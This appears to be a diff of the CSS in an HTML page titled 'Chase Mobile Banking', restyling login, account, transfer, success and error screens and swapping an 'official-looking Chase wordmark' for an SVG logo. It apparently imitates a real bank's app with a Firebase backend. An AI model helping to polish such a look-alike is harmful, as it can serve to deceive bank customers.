@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- IMPROVED: Responsive viewport for all devices -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chase Mobile Banking</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
@@ -41,20 +40,14 @@
             overflow-x: hidden;
             -webkit-font-smoothing: antialiased;
             touch-action: manipulation;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
         }
 
-        /* IMPROVED: Responsive container for all screen sizes */
         #app {
-            width: 100%;
-            max-width: 480px; /* Slightly larger for desktop elegance */
+            max-width: 1200px;
+            margin: 0 auto;
             background: var(--bg-gray);
             min-height: 100vh;
             position: relative;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1); /* Adds depth on larger screens */
         }
 
         /* Auth Screen (Login/Signup) */
@@ -72,26 +65,13 @@
             text-align: center;
         }
 
-        /* IMPROVED: Cleaner, official-looking Chase wordmark */
-        .chase-wordmark {
-            font-family: 'Inter', sans-serif;
-            font-size: 42px;
-            font-weight: 700;
-            color: white;
-            letter-spacing: 2px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-            line-height: 1;
-            display: inline-block;
+        .auth-logo svg {
+            height: 40px;
+            width: auto;
         }
-        .chase-wordmark::after {
-            content: '';
-            display: inline-block;
-            width: 28px;
-            height: 28px;
-            background: white;
-            border-radius: 50%;
-            margin-left: 8px;
-            vertical-align: middle;
+
+        .auth-logo svg path:first-child {
+            fill: white;
         }
 
         .auth-tabs {
@@ -109,11 +89,10 @@
             padding: 10px 20px;
             border-radius: 30px;
             transition: background 0.3s;
-            background: rgba(255,255,255,0.1);
         }
 
         .auth-tab.active {
-            background: rgba(255,255,255,0.25);
+            background: rgba(255,255,255,0.2);
         }
 
         .auth-form-container {
@@ -122,22 +101,19 @@
             padding: 30px 24px;
             flex: 1;
             margin-top: auto;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+            width: 100%;
         }
 
-        /* IMPROVED: Better form styling with visible labels */
         .input-group {
             margin-bottom: 20px;
         }
-        .input-label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text-gray);
-            margin-bottom: 4px;
-        }
+
         .input-field {
             width: 100%;
-            padding: 12px 0;
+            padding: 16px 0;
             border: none;
             border-bottom: 1px solid var(--border-gray);
             font-size: 16px;
@@ -145,16 +121,32 @@
             transition: border-color 0.3s;
             background: transparent;
         }
+
         .input-field:focus {
             border-bottom-color: var(--chase-blue);
         }
-        /* Style for date input placeholder */
+
+        /* Improved date input styling */
         .input-field[type="date"] {
             color: var(--text-dark);
             font-family: 'Inter', sans-serif;
+            padding: 16px 0;
         }
-        .input-field[type="date"]:invalid {
-            color: var(--text-light);
+
+        .input-field[type="date"]::-webkit-calendar-picker-indicator {
+            opacity: 0.5;
+            cursor: pointer;
+        }
+
+        .input-field[type="date"]:valid {
+            color: var(--text-dark);
+        }
+
+        .input-field[type="date"]::-webkit-datetime-edit-text,
+        .input-field[type="date"]::-webkit-datetime-edit-month-field,
+        .input-field[type="date"]::-webkit-datetime-edit-day-field,
+        .input-field[type="date"]::-webkit-datetime-edit-year-field {
+            color: var(--text-dark);
         }
 
         .password-container {
@@ -164,10 +156,11 @@
         .eye-icon {
             position: absolute;
             right: 0;
-            bottom: 12px;
+            top: 50%;
+            transform: translateY(-50%);
             cursor: pointer;
             color: var(--text-gray);
-            padding: 5px;
+            padding: 10px;
         }
 
         .checkbox-row {
@@ -198,7 +191,7 @@
             background: var(--chase-blue);
             color: white;
             border: none;
-            border-radius: 30px; /* More modern, rounded button */
+            border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -207,15 +200,11 @@
 
         .btn-primary:hover {
             background: var(--chase-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(6, 89, 165, 0.3);
         }
 
         .btn-primary:disabled {
             opacity: 0.7;
             cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
         }
 
         .auth-links {
@@ -269,142 +258,1002 @@
             text-decoration: none;
         }
 
-        /* Main App Layout (Keep existing styles from your code, they are fine) */
-        .main-app { display: none; min-height: 100vh; background: var(--bg-gray); padding-bottom: 80px; }
-        .app-header { background: var(--chase-blue); color: white; padding: 50px 20px 20px; position: sticky; top: 0; z-index: 100; }
-        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        /* Use the same wordmark for main app */
-        .chase-wordmark-small { font-size: 24px; font-weight: 700; color: white; letter-spacing: 1px; }
-        .chase-wordmark-small::after { content: ''; display: inline-block; width: 16px; height: 16px; background: white; border-radius: 50%; margin-left: 6px; vertical-align: middle; }
+        /* Main App Layout */
+        .main-app {
+            display: none;
+            min-height: 100vh;
+            background: var(--bg-gray);
+            padding-bottom: 80px;
+        }
 
-        .header-greeting { font-size: 18px; font-weight: 600; margin-left: 10px; }
-        .header-icons { display: flex; gap: 20px; align-items: center; position: relative; }
-        .header-icon { width: 24px; height: 24px; cursor: pointer; font-size: 20px; position: relative; }
-        .notification-badge { position: absolute; top: -8px; right: -8px; background: var(--error); color: white; font-size: 10px; font-weight: 600; min-width: 18px; height: 18px; border-radius: 9px; display: flex; align-items: center; justify-content: center; padding: 0 4px; }
-        .profile-icon { background: rgba(255,255,255,0.2); width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
-        .profile-icon:hover { background: rgba(255,255,255,0.3); }
-        .quick-actions { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
-        .quick-action-btn { background: rgba(255,255,255,0.15); border: none; color: white; padding: 12px 8px; border-radius: 12px; font-size: 11px; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 6px; transition: background 0.3s; touch-action: manipulation; }
-        .quick-action-btn:active { background: rgba(255,255,255,0.25); transform: scale(0.98); }
-        .quick-action-btn i { font-size: 20px; }
-        .balance-card { background: white; border-radius: 16px; padding: 25px 20px; margin: 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .balance-label { font-size: 14px; color: var(--text-gray); margin-bottom: 10px; }
-        .balance-amount { font-size: 36px; font-weight: 700; color: var(--chase-blue); }
-        .balance-account { font-size: 14px; color: var(--text-gray); margin-top: 10px; }
-        .accounts-section { padding: 20px; }
-        .accounts-card { background: white; border-radius: 16px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .accounts-header { font-size: 18px; font-weight: 600; margin-bottom: 15px; color: var(--text-dark); }
-        .account-item { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border-gray); cursor: pointer; touch-action: manipulation; }
-        .account-item:active { background-color: rgba(0,0,0,0.02); }
-        .account-item:last-child { border-bottom: none; }
-        .account-info h3 { font-size: 16px; font-weight: 600; color: var(--text-dark); }
-        .account-number { font-size: 13px; color: var(--text-gray); margin-top: 4px; }
-        .account-balance { font-size: 18px; font-weight: 600; color: var(--text-dark); }
-        .open-account-btn { display: flex; align-items: center; gap: 8px; color: var(--chase-blue); font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; touch-action: manipulation; }
-        .recipient-info { background: var(--chase-light); border-radius: 8px; padding: 15px; margin: 15px 0; display: flex; align-items: center; gap: 15px; }
-        .recipient-avatar { width: 40px; height: 40px; background: var(--chase-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; }
-        .recipient-details h4 { font-size: 16px; margin-bottom: 4px; }
-        .recipient-details p { font-size: 13px; color: var(--text-gray); }
-        .offers-section { padding: 0 20px 20px; }
-        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .section-title { font-size: 16px; font-weight: 600; }
-        .section-link { color: var(--chase-blue); font-size: 14px; text-decoration: none; touch-action: manipulation; }
-        .offers-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; -webkit-overflow-scrolling: touch; scrollbar-width: thin; }
-        .offer-card { min-width: 100px; height: 80px; background: white; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 600; box-shadow: 0 2px 8px rgba(0,0,0,0.08); cursor: pointer; transition: transform 0.2s; touch-action: manipulation; }
-        .offer-card:active { transform: scale(0.95); }
-        .offer-card.office-depot { background: #e31837; color: white; }
-        .offer-card.dell { background: #007db8; color: white; }
-        .investment-card { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; display: flex; align-items: center; gap: 15px; cursor: pointer; transition: transform 0.2s; box-shadow: 0 2px 8px rgba(0,0,0,0.05); touch-action: manipulation; }
-        .investment-card:active { transform: scale(0.98); }
-        .investment-icon { width: 40px; height: 40px; background: var(--chase-light); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--chase-blue); font-size: 20px; }
-        .investment-info h4 { font-size: 15px; margin-bottom: 4px; }
-        .investment-info p { font-size: 13px; color: var(--text-gray); }
-        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; background: white; display: flex; justify-content: space-around; padding: 12px 0 20px; border-top: 1px solid var(--border-gray); z-index: 1000; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; color: var(--text-gray); font-size: 11px; transition: color 0.3s; touch-action: manipulation; padding: 5px 10px; }
-        .nav-item:active { opacity: 0.7; }
-        .nav-item.active { color: var(--chase-blue); }
-        .nav-item i { font-size: 22px; }
-        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: none; align-items: flex-end; justify-content: center; z-index: 2000; opacity: 0; transition: opacity 0.3s; }
-        .modal-overlay.active { display: flex; opacity: 1; }
-        .modal-content { background: white; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; max-height: 90vh; overflow-y: auto; transform: translateY(100%); transition: transform 0.3s; }
-        .modal-overlay.active .modal-content { transform: translateY(0); }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid var(--border-gray); }
-        .modal-title { font-size: 18px; font-weight: 600; }
-        .close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-gray); padding: 10px; touch-action: manipulation; }
-        .transfer-form { padding: 20px; }
-        .form-group { margin-bottom: 20px; }
-        .form-label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: var(--text-dark); }
-        .form-input, .form-select { width: 100%; padding: 14px; border: 1px solid var(--border-gray); border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.3s; }
-        .form-input:focus, .form-select:focus { border-color: var(--chase-blue); }
-        .amount-input { position: relative; }
-        .amount-input::before { content: '$'; position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 16px; color: var(--text-gray); }
-        .amount-input input { padding-left: 28px; }
-        .success-modal { text-align: center; padding: 40px 20px; animation: slideUp 0.5s ease; }
-        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .success-checkmark { width: 80px; height: 80px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; animation: scaleIn 0.5s ease 0.2s both; }
-        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
-        .success-checkmark i { font-size: 40px; color: white; animation: checkmark 0.5s ease 0.5s both; }
-        @keyframes checkmark { from { transform: scale(0) rotate(-45deg); } to { transform: scale(1) rotate(0); } }
-        .success-title { font-size: 24px; font-weight: 700; color: var(--text-dark); margin-bottom: 15px; animation: fadeIn 0.5s ease 0.4s both; }
-        .success-amount { font-size: 32px; font-weight: 700; color: var(--chase-blue); margin-bottom: 10px; animation: fadeIn 0.5s ease 0.6s both; }
-        .success-recipient { font-size: 18px; color: var(--text-gray); margin-bottom: 20px; animation: fadeIn 0.5s ease 0.8s both; }
-        .success-details { background: var(--chase-light); border-radius: 12px; padding: 20px; margin: 25px 0; text-align: left; animation: fadeIn 0.5s ease 1s both; }
-        .success-detail-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
-        .success-detail-item:last-child { margin-bottom: 0; }
-        .success-detail-label { color: var(--text-gray); }
-        .success-detail-value { font-weight: 600; color: var(--text-dark); }
-        .success-divider { height: 1px; background: var(--border-gray); margin: 15px 0; }
-        .success-balance { font-size: 15px; color: var(--text-dark); margin-bottom: 25px; padding: 10px; background: white; border-radius: 8px; animation: fadeIn 0.5s ease 1.2s both; }
-        .success-balance span { font-weight: 700; color: var(--chase-blue); }
-        .btn-success { background: var(--success); width: 100%; padding: 16px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 10px; animation: fadeIn 0.5s ease 1.4s both; }
-        .btn-success:hover { background: #218838; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3); }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .error-modal { text-align: center; padding: 30px 20px; }
-        .error-modal .chase-wordmark { font-size: 32px; color: var(--chase-blue); margin-bottom: 20px; }
-        .error-modal .chase-wordmark::after { background: var(--chase-blue); width: 20px; height: 20px; }
-        .error-code { color: var(--text-gray); font-size: 14px; margin-bottom: 10px; }
-        .error-title { font-size: 20px; font-weight: 600; margin-bottom: 15px; }
-        .error-message { font-size: 14px; color: var(--text-gray); line-height: 1.6; margin-bottom: 20px; }
-        .phone-number { color: var(--chase-blue); font-weight: 600; font-size: 18px; }
-        .transactions-list { padding: 20px; background: white; min-height: calc(100vh - 200px); }
-        .transaction-item { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border-gray); }
-        .transaction-info { flex: 1; }
-        .transaction-name { font-size: 15px; font-weight: 500; margin-bottom: 4px; }
-        .transaction-date { font-size: 12px; color: var(--text-gray); }
-        .transaction-amount { text-align: right; }
-        .transaction-amount.positive { color: var(--success); }
-        .transaction-amount.negative { color: var(--text-dark); }
-        .transaction-balance { font-size: 12px; color: var(--text-gray); margin-top: 2px; }
-        .notifications-list { padding: 20px; }
-        .notification-item { background: white; border-radius: 12px; padding: 15px; margin-bottom: 10px; border-left: 4px solid var(--chase-blue); box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .notification-title { font-weight: 600; margin-bottom: 5px; }
-        .notification-desc { font-size: 13px; color: var(--text-gray); margin-bottom: 5px; }
-        .notification-time { font-size: 11px; color: var(--text-light); }
-        .card-options { padding: 20px; }
-        .card-option { border: 2px solid var(--border-gray); border-radius: 12px; padding: 20px; margin-bottom: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: all 0.3s; touch-action: manipulation; }
-        .card-option:active { border-color: var(--chase-blue); background: var(--chase-light); }
-        .card-option.selected { border-color: var(--chase-blue); background: var(--chase-light); }
-        .card-name { font-weight: 600; font-size: 15px; }
-        .card-fee { color: var(--text-gray); font-size: 14px; }
-        .cards-page { background: white; min-height: calc(100vh - 80px); padding: 20px; }
-        .no-cards { text-align: center; padding: 60px 20px; }
-        .no-cards-icon { width: 80px; height: 80px; background: var(--bg-gray); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 40px; color: var(--text-gray); }
-        .no-cards h3 { font-size: 18px; margin-bottom: 10px; }
-        .no-cards p { color: var(--text-gray); font-size: 14px; margin-bottom: 20px; }
-        .btn-secondary { background: var(--chase-blue); color: white; border: none; padding: 14px 28px; border-radius: 30px; font-size: 14px; font-weight: 600; cursor: pointer; touch-action: manipulation; }
-        .btn-secondary:active { background: var(--chase-dark); }
-        .application-status { background: white; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
-        .status-badge { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; margin-left: 10px; }
-        .status-badge.under-review { background: #fff3cd; color: #856404; }
-        .profile-info { padding: 30px 20px; text-align: center; }
-        .profile-avatar { width: 80px; height: 80px; background: var(--chase-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: white; font-size: 32px; font-weight: 600; }
-        .profile-detail { margin-bottom: 15px; padding: 10px; background: var(--bg-gray); border-radius: 8px; }
-        .profile-label { font-size: 12px; color: var(--text-gray); margin-bottom: 4px; }
-        .profile-value { font-size: 16px; font-weight: 600; }
-        .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%) translateY(100px); background: rgba(0,0,0,0.9); color: white; padding: 14px 24px; border-radius: 8px; font-size: 14px; opacity: 0; transition: all 0.3s; z-index: 3000; display: flex; align-items: center; gap: 10px; pointer-events: none; }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .app-header {
+            background: var(--chase-blue);
+            color: white;
+            padding: 50px 20px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .chase-logo-svg {
+            height: 20px;
+            width: auto;
+        }
+
+        .chase-logo-svg path:first-child {
+            fill: white;
+        }
+
+        .header-greeting {
+            font-size: 18px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            position: relative;
+        }
+
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            font-size: 20px;
+            position: relative;
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: var(--error);
+            color: white;
+            font-size: 10px;
+            font-weight: 600;
+            min-width: 18px;
+            height: 18px;
+            border-radius: 9px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 4px;
+        }
+
+        .profile-icon {
+            background: rgba(255,255,255,0.2);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .profile-icon:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .quick-action-btn {
+            background: rgba(255,255,255,0.15);
+            border: none;
+            color: white;
+            padding: 12px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.3s;
+            touch-action: manipulation;
+        }
+
+        .quick-action-btn:active {
+            background: rgba(255,255,255,0.25);
+            transform: scale(0.98);
+        }
+
+        .quick-action-btn i {
+            font-size: 20px;
+        }
+
+        /* Balance Card */
+        .balance-card {
+            background: white;
+            border-radius: 16px;
+            padding: 25px 20px;
+            margin: 20px auto;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            max-width: 600px;
+        }
+
+        .balance-label {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 10px;
+        }
+
+        .balance-amount {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--chase-blue);
+        }
+
+        .balance-account {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-top: 10px;
+        }
+
+        /* Accounts Section */
+        .accounts-section {
+            padding: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .accounts-card {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .accounts-header {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+        }
+
+        .account-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border-gray);
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        .account-item:active {
+            background-color: rgba(0,0,0,0.02);
+        }
+
+        .account-item:last-child {
+            border-bottom: none;
+        }
+
+        .account-info h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .account-number {
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-top: 4px;
+        }
+
+        .account-balance {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .open-account-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--chase-blue);
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 15px;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+
+        /* Recipient Info */
+        .recipient-info {
+            background: var(--chase-light);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .recipient-avatar {
+            width: 40px;
+            height: 40px;
+            background: var(--chase-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+        }
+
+        .recipient-details h4 {
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .recipient-details p {
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+
+        /* Offers Section */
+        .offers-section {
+            padding: 0 20px 20px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .section-link {
+            color: var(--chase-blue);
+            font-size: 14px;
+            text-decoration: none;
+            touch-action: manipulation;
+        }
+
+        .offers-scroll {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding-bottom: 10px;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+        }
+
+        .offer-card {
+            min-width: 100px;
+            height: 80px;
+            background: white;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            cursor: pointer;
+            transition: transform 0.2s;
+            touch-action: manipulation;
+        }
+
+        .offer-card:active {
+            transform: scale(0.95);
+        }
+
+        .offer-card.office-depot {
+            background: #e31837;
+            color: white;
+        }
+
+        .offer-card.dell {
+            background: #007db8;
+            color: white;
+        }
+
+        /* Investment Cards */
+        .investment-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            touch-action: manipulation;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .investment-card:active {
+            transform: scale(0.98);
+        }
+
+        .investment-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--chase-light);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--chase-blue);
+            font-size: 20px;
+        }
+
+        .investment-info h4 {
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+
+        .investment-info p {
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 1200px;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0 20px;
+            border-top: 1px solid var(--border-gray);
+            z-index: 1000;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            color: var(--text-gray);
+            font-size: 11px;
+            transition: color 0.3s;
+            touch-action: manipulation;
+            padding: 5px 10px;
+        }
+
+        .nav-item:active {
+            opacity: 0.7;
+        }
+
+        .nav-item.active {
+            color: var(--chase-blue);
+        }
+
+        .nav-item i {
+            font-size: 22px;
+        }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 20px;
+            max-height: 90vh;
+            overflow-y: auto;
+            transform: scale(0.9);
+            transition: transform 0.3s;
+            margin: 20px;
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid var(--border-gray);
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-gray);
+            padding: 10px;
+            touch-action: manipulation;
+        }
+
+        /* Transfer Form */
+        .transfer-form {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--text-dark);
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--border-gray);
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus, .form-select:focus {
+            border-color: var(--chase-blue);
+        }
+
+        .amount-input {
+            position: relative;
+        }
+
+        .amount-input::before {
+            content: '$';
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--text-gray);
+        }
+
+        .amount-input input {
+            padding-left: 28px;
+        }
+
+        /* Success Modal */
+        .success-modal {
+            text-align: center;
+            padding: 40px 20px;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            animation: scaleIn 0.5s ease 0.2s both;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .success-checkmark i {
+            font-size: 40px;
+            color: white;
+            animation: checkmark 0.5s ease 0.5s both;
+        }
+
+        @keyframes checkmark {
+            from {
+                transform: scale(0) rotate(-45deg);
+            }
+            to {
+                transform: scale(1) rotate(0);
+            }
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 15px;
+            animation: fadeIn 0.5s ease 0.4s both;
+        }
+
+        .success-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--chase-blue);
+            margin-bottom: 10px;
+            animation: fadeIn 0.5s ease 0.6s both;
+        }
+
+        .success-recipient {
+            font-size: 18px;
+            color: var(--text-gray);
+            margin-bottom: 20px;
+            animation: fadeIn 0.5s ease 0.8s both;
+        }
+
+        .success-details {
+            background: var(--chase-light);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: left;
+            animation: fadeIn 0.5s ease 1s both;
+        }
+
+        .success-detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .success-detail-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .success-detail-label {
+            color: var(--text-gray);
+        }
+
+        .success-detail-value {
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .success-divider {
+            height: 1px;
+            background: var(--border-gray);
+            margin: 15px 0;
+        }
+
+        .success-balance {
+            font-size: 15px;
+            color: var(--text-dark);
+            margin-bottom: 25px;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease 1.2s both;
+        }
+
+        .success-balance span {
+            font-weight: 700;
+            color: var(--chase-blue);
+        }
+
+        .btn-success {
+            background: var(--success);
+            width: 100%;
+            padding: 16px;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            animation: fadeIn 0.5s ease 1.4s both;
+        }
+
+        .btn-success:hover {
+            background: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Error Modal */
+        .error-modal {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .error-modal svg {
+            height: 40px;
+            width: auto;
+            margin-bottom: 20px;
+        }
+
+        .error-modal svg path:first-child {
+            fill: var(--chase-blue);
+        }
+
+        .error-code {
+            color: var(--text-gray);
+            font-size: 14px;
